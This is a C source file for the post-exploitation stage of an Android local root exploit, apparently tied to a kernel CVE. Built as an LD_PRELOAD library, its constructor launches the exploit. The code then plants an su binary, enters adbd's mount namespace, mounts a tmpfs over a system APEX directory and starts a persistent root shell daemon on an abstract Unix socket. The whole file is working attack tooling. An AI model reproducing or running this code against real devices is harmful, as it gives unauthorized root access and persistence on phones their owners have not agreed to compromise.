#include "common.h"
#include <sys/mount.h>
#include <sys/un.h>

#define SU_DST_DIR "/apex/com.android.virt/bin"
#define SU_DST SU_DST_DIR "/su"
#define SU_LOCAL "/data/local/tmp/su"
#define SU_SOCK "/data/local/tmp/temp_su.sock"
#define SU_LOG "/data/local/tmp/su_daemon.log"

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static int path_is_mounted(const char *path) {
  int fd = open("/proc/mounts", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  char mounts[16384];
  ssize_t n = read(fd, mounts, sizeof(mounts) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    return 0;
  }
  mounts[n] = 0;

  char needle[512];
  snprintf(needle, sizeof(needle), " %s ", path);
  return strstr(mounts, needle) != NULL;
}

static int ensure_su_mount(void) {
  if (path_is_mounted(SU_DST_DIR)) {
    return 1;
  }
  if (mount("tmpfs", SU_DST_DIR, "tmpfs", 0, "mode=0755,size=4m") == 0) {
    return 1;
  }
  return errno == EBUSY;
}

static int write_embedded_su_file(const char *dir, const char *dst) {
  /*
   * Since 2026-11-14 the daemon binary is pushed by the host instead of being
   * incbin'd into preload.so.  That frees ~18 KB of the 161144-byte punch
   * budget, so new features no longer have to be paid for by deleting logs.
   * All the embedded-copy code below is kept, disabled, for reference.
   */
  (void)dir;
  if (chmod(dst, 0755) != 0) {
    pr_info("pushed su chmod %s errno=%d\n", dst, errno);
    return 0;
  }
  pr_success("pushed su ready %s\n", dst);
  return 1;
#if 0
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s/.su.new.%d", dir, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    int create_errno = errno;
    /* uid 0 + shell SID cannot create in /data/local/tmp (EACCES).
     * Truncate a file the uid-2000 constructor already planted. */
    fd = open(dst, O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (fd < 0) {
      pr_info("embedded su open %s errno=%d dst=%s errno=%d uid=%d euid=%d\n",
              tmp, create_errno, dst, errno, getuid(), geteuid());
      return 0;
    }
    int ok = write_full(fd, embedded_su_start, size);
    int saved_errno = errno;
    if (!ok) {
      pr_info("embedded su write %s errno=%d\n", dst, saved_errno);
    }
    if (fchmod(fd, 0755) != 0 && ok) {
      saved_errno = errno;
      pr_info("embedded su fchmod %s errno=%d (ignored)\n", dst, saved_errno);
    }
    if (close(fd) != 0 && ok) {
      ok = 0;
      saved_errno = errno;
    }
    if (!ok) {
      errno = saved_errno;
      return 0;
    }
    pr_success("embedded su wrote %zu bytes to %s (truncate)\n", size, dst);
    return 1;
  }
  int ok = write_full(fd, embedded_su_start, size);
  int saved_errno = errno;
  if (!ok) {
    pr_info("embedded su write %s errno=%d\n", tmp, saved_errno);
  } else {
    /* fchown(0,0) is optional.  With shell SID it can EACCES even as
     * uid 0; the file is still a usable su client. */
    if (fchown(fd, 0, 0) != 0) {
      pr_info("embedded su fchown %s errno=%d (ignored)\n", tmp, errno);
    }
    if (fchmod(fd, 0755) != 0) {
      saved_errno = errno;
      pr_info("embedded su fchmod %s errno=%d\n", tmp, saved_errno);
      ok = 0;
    }
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    pr_info("embedded su rename %s -> %s errno=%d\n", tmp, dst, saved_errno);
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  pr_success("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
#endif
}

static int write_embedded_su(void) {
  /* No tmpfs mount any more: the host pushes /data/local/tmp/su as uid 2000,
   * which is exactly the ownership the client needs. */
  return write_embedded_su_file(SU_DST_DIR, SU_DST);
}

static pid_t find_adbd_pid(void) {
  DIR *dir = opendir("/proc");
  if (!dir) {
    return -1;
  }

  struct dirent *de;
  while ((de = readdir(dir)) != NULL) {
    char *end = NULL;
    long pid_long = strtol(de->d_name, &end, 10);
    if (!end || *end || pid_long <= 1 || pid_long > INT32_MAX) {
      continue;
    }

    char path[64];
    snprintf(path, sizeof(path), "/proc/%ld/comm", pid_long);
    char comm[32];
    read_first_line(path, comm, sizeof(comm));
    if (strcmp(comm, "adbd") == 0) {
      closedir(dir);
      return (pid_t)pid_long;
    }
  }

  closedir(dir);
  return -1;
}

static int install_su_in_pid_mntns(pid_t target) {
  pid_t child = fork();
  if (child == 0) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
    if (!hkip_exec_window()) {
      _exit(6);
    }
#endif
    char ns_path[64];
    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/mnt", target);
    int ns_fd = open(ns_path, O_RDONLY | O_CLOEXEC);
    if (ns_fd < 0) {
      _exit(2);
    }
    if (setns(ns_fd, CLONE_NEWNS) != 0) {
      _exit(3);
    }
    close(ns_fd);
    if (!ensure_su_mount()) {
      _exit(4);
    }
    _exit(write_embedded_su_file(SU_DST_DIR, SU_DST) ? 0 : 5);
  }
  if (child < 0) {
    return 0;
  }

  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {
  }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int install_adb_visible_su(void) {
  pid_t adbd = find_adbd_pid();
  if (adbd <= 0) {
    pr_info("adb-visible su skipped: adbd pid not found\n");
    return 0;
  }
  int ok = install_su_in_pid_mntns(adbd);
  pr_info("adb-visible su install adbd=%d ok=%d path=%s\n", adbd, ok, SU_DST);
  return ok;
}

static int install_local_su_client(void) {
  int ok = write_embedded_su_file("/data/local/tmp", SU_LOCAL);
  pr_info("local su client install ok=%d path=%s\n", ok, SU_LOCAL);
  return ok;
}

static void install_extra_su_clients(void) {
  install_local_su_client();
  install_adb_visible_su();
}

static pid_t start_su_daemon(const char *exe) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* Already inside the pid=0 window.  Do not fork (new pid needs a
   * second walk) and do not create files as uid 0. */
  pr_info("embedded su execl --daemon exe=%s pid=%d uid=%d gid=%d\n",
          exe, getpid(), getuid(), getgid());
  fflush(stdout);
  fflush(stderr);
  execl(exe, "su", "--daemon", (char *)NULL);
  pr_info("embedded su execl failed errno=%d\n", errno);
  return -1;
#else
  unlink(SU_SOCK);
  unlink(SU_LOG);

  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }
    int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(exe, "su", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
#endif
}

static int su_abstract_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  memcpy(sun.sun_path, "\0cve43499_su", 13);
  socklen_t slen = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 13);
  int ok = connect(fd, (struct sockaddr *)&sun, slen) == 0;
  close(fd);
  return ok;
}

static int wait_su_socket(pid_t pid) {
  for (int i = 0; i < 50; i++) {
    if (su_abstract_ready() || access(SU_SOCK, F_OK) == 0) {
      pr_success("embedded su daemon ready pid=%d\n", pid);
      return 1;
    }
    usleep(100000);
  }
  errno = ETIMEDOUT;
  pr_info("embedded su daemon timeout pid=%d\n", pid);
  return 0;
}

int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* uid 0 + shell SID cannot create in /data/local/tmp (EACCES).
   * Constructor plants the client as uid 2000; do not rewrite it. */
  int wrote_apex = 0;
  if (access(SU_LOCAL, X_OK) != 0) {
    install_local_su_client();
  } else {
    pr_info("local su client already planted path=%s\n", SU_LOCAL);
  }
#else
  int wrote_apex = write_embedded_su();
  install_extra_su_clients();
#endif
  const char *exe = (access(SU_DST, X_OK) == 0) ? SU_DST : SU_LOCAL;
  if (access(exe, X_OK) != 0) {
    pr_info("embedded su no executable apex=%d errno=%d\n", wrote_apex, errno);
    return 0;
  }
  pr_info("embedded su start exe=%s uid=%d euid=%d\n",
          exe, getuid(), geteuid());

  pid_t pid = start_su_daemon(exe);
  if (pid <= 0) {
    return 0;
  }
  if (daemon_pid) {
    *daemon_pid = pid;
  }
  return wait_su_socket(pid);
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  unsetenv("LD_PRELOAD");

  /* Plant as uid 2000 so the rooted child can truncate instead of create. */
  (void)write_embedded_su_file("/data/local/tmp", SU_LOCAL);

  char *argv[2] = {
    "preload.so",
    NULL,
  };

  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
